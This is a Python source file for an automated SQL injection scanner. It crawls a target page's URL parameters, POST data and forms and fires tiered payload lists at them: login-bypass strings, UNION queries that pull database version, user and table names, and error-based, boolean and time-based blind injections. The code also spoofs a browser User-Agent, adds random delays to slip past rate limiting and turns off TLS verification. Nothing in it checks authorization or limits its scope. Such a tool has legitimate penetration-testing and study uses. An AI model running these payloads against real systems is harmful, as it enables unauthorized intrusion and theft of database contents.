"""
SQL Injection Scanner Module
"""

import re
import time
import requests
import threading
import time
import random
import string
from urllib.parse import urlparse, parse_qs, urlunparse
from bs4 import BeautifulSoup
from utils.logger import setup_logger

class SQLScanner:
    def __init__(self, threads=10, timeout=10, level=1, risk=1):
        self.threads = threads
        self.timeout = timeout
        self.level = level
        self.risk = risk
        self.logger = setup_logger(verbose=True)
        self.session = requests.Session()
        
        # Setup realistic headers to avoid blocking
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # SQL injection payloads based on level and risk
        self.payloads = self._get_payloads()
        
    def _get_payloads(self):
        """Get payloads based on scan level and risk"""
        payloads = {
            1: [  # Basic payloads
                "'", '"', "\\", "'\"", "'\\", "\"\\",
                "1' OR '1'='1", "1\" OR \"1\"=\"1",
                "' OR 1=1--", "\" OR 1=1--",
                "' OR 1=1#", "\" OR 1=1#",
                "admin'--", "admin'#", "' or 1--", "\" or 1--",
                "' or 1# ", "\" or 1#", "') or '1'='1--",
                "') or ('1'='1--", "')) or 1=1--",
            ],
            2: [  # Union-based payloads
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version--", "' UNION SELECT database()--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT 1,@@version,3--", "' UNION SELECT 1,database(),3--",
                "' UNION SELECT 1,user(),3--", "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
                "1' UNION SELECT 1,2,3--", "1' UNION SELECT @@version,2,3--",
                "1' UNION SELECT database(),2,3--", "1' UNION SELECT user(),2,3--",
            ],
            3: [  # Error-based payloads
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND ROW(1234,1234)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM (SELECT * FROM information_schema.tables GROUP BY x)a)--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            4: [  # Boolean-based payloads
                "' AND 1=1--", "' AND 1=2--",
                "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
                "' AND (SELECT LENGTH(database()))>0--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>64--",
                "' AND (SELECT LENGTH(user()))>0--",
                "' AND (SELECT COUNT(*) FROM information_schema.columns)>0--",
                "1' AND 1=1--", "1' AND 1=2--",
                "1' AND (SELECT SUBSTRING(version(),1,1))='5'--",
            ],
            5: [  # Time-based payloads
                "' AND SLEEP(5)--", "' AND WAITFOR DELAY '00:00:05'--",
                "' AND pg_sleep(5)--", "' AND BENCHMARK(50000000,MD5(1))--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)>0--",
                "1' AND SLEEP(5)--", "1' AND WAITFOR DELAY '00:00:05'--",
                "1' AND pg_sleep(5)--", "1' AND BENCHMARK(50000000,MD5(1))--",
                "'; WAITFOR DELAY '00:00:05'--", "'; SELECT SLEEP(5)--",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT SLEEP(5)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ]
        }
        
        # Filter payloads based on risk level
        if self.risk == 1:
            # Low risk - only non-destructive payloads
            return {k: v for k, v in payloads.items() if k <= 2}
        elif self.risk == 2:
            # Medium risk
            return {k: v for k, v in payloads.items() if k <= 4}
        else:
            # High risk - all payloads
            return payloads
    
    def scan_target(self, url, data=None, cookies=None):
        """Main scanning function"""
        vulnerabilities = []
        
        self.logger.info(f"[*] Starting scan for: {url}")
        
        # Parse URL
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        self.logger.info(f"[*] Base URL: {base_url}")
        
        # Set cookies if provided
        if cookies:
            self.session.cookies.update(dict(cookie.split('=') for cookie in cookies.split(';')))
            self.logger.info(f"[*] Using cookies: {cookies}")
        
        # Extract parameters from URL
        url_params = parse_qs(parsed_url.query)
        self.logger.info(f"[*] URL parameters found: {list(url_params.keys())}")
        
        # Extract parameters from POST data
        post_params = {}
        if data:
            post_params = dict(param.split('=') for param in data.split('&'))
            self.logger.info(f"[*] POST parameters found: {list(post_params.keys())}")
        
        # Find forms in the page
        forms = self._find_forms(url)
        self.logger.info(f"[*] Found {len(forms)} forms on the page")
        
        # Test URL parameters
        for param in url_params:
            self.logger.info(f"[*] Testing URL parameter: {param}")
            vuln = self._test_parameter(url, param, 'GET')
            if vuln:
                vulnerabilities.append(vuln)
                self.logger.info(f"[+] Vulnerability found in {param}")
            else:
                self.logger.debug(f"[-] No vulnerability in {param}")
        
        # Test POST parameters
        if post_params:
            for param in post_params:
                self.logger.info(f"[*] Testing POST parameter: {param}")
                vuln = self._test_parameter(url, param, 'POST', data)
                if vuln:
                    vulnerabilities.append(vuln)
                    self.logger.info(f"[+] Vulnerability found in {param}")
                else:
                    self.logger.debug(f"[-] No vulnerability in {param}")
        
        # Test form inputs
        for form in forms:
            self.logger.info(f"[*] Testing form: {form.get('action', 'unknown')}")
            for input_field in form.get('inputs', []):
                vuln = self._test_form_input(base_url, form, input_field)
                if vuln:
                    vulnerabilities.append(vuln)
                    self.logger.info(f"[+] Form vulnerability found in {input_field['name']}")
        
        self.logger.info(f"[*] Scan completed. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
    
    def _find_forms(self, url):
        """Find all forms in the page"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_info = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    if input_info['name']:
                        form_info['inputs'].append(input_info)
                
                forms.append(form_info)
            
            return forms
        except Exception as e:
            self.logger.error(f"Error finding forms: {str(e)}")
            return []
    
    def _test_parameter(self, url, param_name, method='GET', data=None):
        """Test a specific parameter for SQL injection"""
        try:
            # Get original response
            original_response = self._make_request(url, method, data)
            if not original_response:
                return None
            
            original_length = len(original_response.text)
            original_time = original_response.elapsed.total_seconds()
            
            # Test each payload
            for level, payloads in self.payloads.items():
                if level > self.level:
                    continue
                    
                for payload in payloads:
                    modified_url = self._inject_payload(url, param_name, payload, method, data)
                    modified_data = self._inject_payload(url, param_name, payload, method, data) if method == 'POST' else data
                    
                    test_url = modified_url if method == 'GET' else url
                    test_response = self._make_request(test_url, method, modified_data)
                    
                    if not test_response:
                        continue
                    
                    # Check for SQL injection indicators
                    if self._is_vulnerable(test_response, original_response, original_length, original_time):
                        return {
                            'url': url,
                            'parameter': param_name,
                            'method': method,
                            'payload': payload,
                            'type': self._determine_injection_type(payload),
                            'level': level,
                            'response_time': test_response.elapsed.total_seconds()
                        }
        
        except Exception as e:
            self.logger.error(f"Error testing parameter {param_name}: {str(e)}")
        
        return None
    
    def _test_form_input(self, base_url, form, input_field):
        """Test form input for SQL injection"""
        try:
            form_url = base_url + form['action'] if form['action'] else base_url
            
            # Create test data
            form_data = {}
            for input_field in form['inputs']:
                form_data[input_field['name']] = input_field['value'] or 'test'
            
            # Test each payload on each input
            for level, payloads in self.payloads.items():
                if level > self.level:
                    continue
                    
                for payload in payloads:
                    test_data = form_data.copy()
                    test_data[input_field['name']] = payload
                    
                    try:
                        response = self.session.post(
                            form_url,
                            data=test_data,
                            timeout=self.timeout
                        )
                        
                        if self._is_vulnerable(response, None, 0, 0):
                            return {
                                'url': form_url,
                                'parameter': input_field['name'],
                                'method': 'POST',
                                'payload': payload,
                                'type': self._determine_injection_type(payload),
                                'level': level,
                                'form_action': form['action']
                            }
                    except:
                        continue
        
        except Exception as e:
            self.logger.error(f"Error testing form input {input_field['name']}: {str(e)}")
        
        return None
    
    def _inject_payload(self, url, param_name, payload, method='GET', data=None):
        """Inject payload into parameter"""
        if method == 'GET':
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param_name] = [payload]
            new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
            new_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            return new_url
        else:
            if data:
                params = dict(param.split('=') for param in data.split('&'))
                params[param_name] = payload
                return '&'.join([f"{k}={v}" for k, v in params.items()])
            return f"{param_name}={payload}"
    
    def _make_request(self, url, method='GET', data=None):
        """Make HTTP request with better error handling"""
        try:
            # Add random delay to avoid rate limiting
            time.sleep(random.uniform(0.1, 0.5))
            
            if method == 'GET':
                response = self.session.get(url, timeout=self.timeout, verify=False)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout, verify=False)
            
            # Check if we got blocked
            if response.status_code in [403, 429, 503]:
                self.logger.warning(f"[*] Got blocked with status {response.status_code}")
                return None
            
            return response
            
        except requests.exceptions.SSLError:
            self.logger.warning(f"[*] SSL error for {url}, trying without verification")
            try:
                if method == 'GET':
                    return self.session.get(url, timeout=self.timeout, verify=False)
                else:
                    return self.session.post(url, data=data, timeout=self.timeout, verify=False)
            except:
                return None
                
        except requests.exceptions.Timeout:
            self.logger.warning(f"[*] Timeout for {url}")
            return None
            
        except requests.exceptions.ConnectionError:
            self.logger.warning(f"[*] Connection error for {url}")
            return None
            
        except Exception as e:
            self.logger.debug(f"[*] Request error for {url}: {str(e)}")
            return None
    
    def _is_vulnerable(self, test_response, original_response, original_length, original_time):
        """Check if response indicates SQL injection vulnerability"""
        if not test_response:
            return False
        
        response_text = test_response.text.lower()
        
        self.logger.debug(f"[*] Testing response: {response_text[:200]}...")
        
        # Check for SQL errors in response
        sql_errors = [
            "sql syntax", "mysql_fetch", "mysql_num_rows", "mysql_query",
            "ora-", "oracle error", "microsoft ole db provider", "odbc drivers error",
            "postgresql query failed", "warning: pg_", "valid postgresql result",
            "sqlite_.operationalerror", "sqlite.operationalerror",
            "sqlserver jdbc driver", "com.microsoft.sqlserver",
            "unclosed quotation mark", "incorrect syntax near", "syntax error",
            "column .* not found", "no such table", "ambiguous column name",
            "mysql client run out of memory", "mysql server has gone away",
            "supplied argument is not a valid mysql result resource",
            "table .* doesn't exist", "unknown column", "column .* ambiguous",
            "field .* doesn't have a default value", "duplicate entry",
            "foreign key constraint", "cannot add or update a child row",
            "mysql_fetch_assoc()", "mysql_fetch_array()", "mysql_num_rows()",
            "mysql_query()", "mysql_error()", "mysql_connect()", "mysql_select_db()",
            "pg_query()", "pg_exec()", "pg_fetch_array()", "pg_fetch_assoc()",
            "sqlite_query()", "sqlite_exec()", "sqlite_fetch_array()", "sqlite_fetch_assoc()",
        ]
        
        # Check for any SQL error
        for error in sql_errors:
            if error in response_text:
                self.logger.info(f"[+] SQL error detected: {error}")
                return True
        
        # Check for time-based delays
        if test_response.elapsed.total_seconds() > original_time + 3:
            self.logger.info("[+] Time-based delay detected")
            return True
        
        # Check for content length differences (boolean-based)
        if original_length > 0:
            length_diff = abs(len(test_response.text) - original_length)
            if length_diff > original_length * 0.3:  # 30% difference
                self.logger.info(f"[+] Content length difference detected: {length_diff}")
                return True
        
        # Check for specific success indicators
        success_indicators = [
            "logged in", "welcome", "dashboard", "admin", "success",
            "access granted", "authentication successful"
        ]
        
        for indicator in success_indicators:
            if indicator in response_text and original_response:
                if indicator not in original_response.text.lower():
                    self.logger.info(f"[+] Success indicator detected: {indicator}")
                    return True
        
        return False
    
    def _determine_injection_type(self, payload):
        """Determine type of SQL injection based on payload"""
        if "UNION" in payload.upper():
            return "union-based"
        elif "SLEEP" in payload.upper() or "WAITFOR" in payload.upper() or "BENCHMARK" in payload.upper():
            return "time-based"
        elif "AND" in payload.upper() and ("1=1" in payload or "1=2" in payload):
            return "boolean-based"
        elif any(x in payload.upper() for x in ["EXTRACTVALUE", "CONCAT", "FLOOR", "RAND"]):
            return "error-based"
        else:
            return "generic"
